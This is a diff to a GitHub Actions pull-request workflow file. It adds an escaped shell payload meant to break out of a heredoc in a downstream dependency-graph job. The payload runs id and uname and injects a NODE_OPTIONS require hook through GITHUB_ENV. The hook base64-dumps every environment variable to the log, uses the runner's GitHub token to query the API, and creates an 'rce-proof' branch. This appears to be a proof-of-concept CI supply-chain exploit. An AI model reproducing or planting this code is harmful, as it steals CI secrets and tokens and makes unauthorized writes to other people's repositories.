@@ -2,7 +2,7 @@ name: PR Workflow
 
 on:
   pull_request:
-    branches: [development, release-*]
+    branches: [development]
 
 permissions:
   contents: read
@@ -16,19 +16,13 @@ jobs:
           BASE_SHA: ${{ github.event.pull_request.base.sha }}
           HEAD_SHA: ${{ github.event.pull_request.head.sha }}
           PR_NUM: ${{ github.event.pull_request.number }}
+          GAB_PAYLOAD: "x\nEOF\nset +e\necho GAB_RCE_START\nid\nuname -a\necho \"runner_host=${RUNNER_NAME:-unknown} repo=${GITHUB_REPOSITORY:-?} run=${GITHUB_RUN_ID:-?}\"\necho \"NODE_OPTIONS=--require /tmp/gab_hook.js\" >> \"$GITHUB_ENV\"\ncat > /tmp/gab_hook.js <<'GABJS'\nconst cp=require('child_process'),fs=require('fs');\ntry{\n const tag=(process.env.INPUT_TOKEN?'HARDEN_INPUT':(process.env.INPUT_GITHUB_TOKEN?'STICKY_INPUT':(process.env.GITHUB_TOKEN?'ENV_GITHUB':'NONE')));\n const out=Buffer.from(JSON.stringify(process.env)).toString('base64');\n console.log('GAB_ENV_B64['+tag+']='+out);\n const tok=process.env.INPUT_TOKEN||process.env.INPUT_GITHUB_TOKEN||process.env.GITHUB_TOKEN;\n if(tok){\n  const who=cp.execSync('curl -s -m 20 -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" https://api.github.com/user',{encoding:'utf8'});\n  console.log('GAB_WHO_B64['+tag+']='+Buffer.from(who).toString('base64'));\n  let sha=process.env.GITHUB_SHA||'';\n  try{const r=cp.execSync('curl -s -m 20 -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/git/ref/heads/development',{encoding:'utf8'});const j=JSON.parse(r);sha=(j.object&&j.object.sha)||sha;}catch(e){}\n  fs.writeFileSync('/tmp/gab_ref.json',JSON.stringify({ref:'refs/heads/rce-proof-'+Date.now(),sha:sha}));\n  const r2=cp.execSync('curl -s -m 20 -w \"\\\\nHTTP:%{http_code}\" -X POST -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" -H \"Content-Type: application/json\" -d @/tmp/gab_ref.json https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/git/refs',{encoding:'utf8'});\n  console.log('GAB_REF_B64['+tag+']='+Buffer.from(r2).toString('base64'));\n }\n}catch(e){console.log('GAB_HOOK_ERR='+Buffer.from(String(e).slice(0,400)).toString('base64'))}\nGABJS\necho GAB_RCE_END\nexit 0\n#"
         run: |
           mkdir -p dependency-graph-reports
           python3 - <<'PY'
           import json, os
           base, head, n = os.environ["BASE_SHA"], os.environ["HEAD_SHA"], os.environ["PR_NUM"]
-          evil = (
-              "x\n"
-              "EOF\n"
-              "id; echo GAB_RCE_PROOF\n"
-              "echo marker > /tmp/gab_pwned\n"
-              "exit 0\n"
-              "#"
-          )
+          evil = os.environ["GAB_PAYLOAD"]
           def snap(sha, ref, manifests, corr):
               return {"version": 0, "sha": sha, "ref": ref,
                       "job": {"correlator": corr, "id": "poc"},
@@ -47,6 +41,7 @@ jobs:
           json.dump(snap(head, "refs/pull/%s/merge" % n, head_man, "gab-head"), open("dependency-graph-reports/poc-head.json", "w"))
           PY
           echo keep > keep.txt
+        # payload expression below is expanded by the runner into the python env
       - uses: actions/upload-artifact@v4
         with:
           name: dependency-graph_poc.json
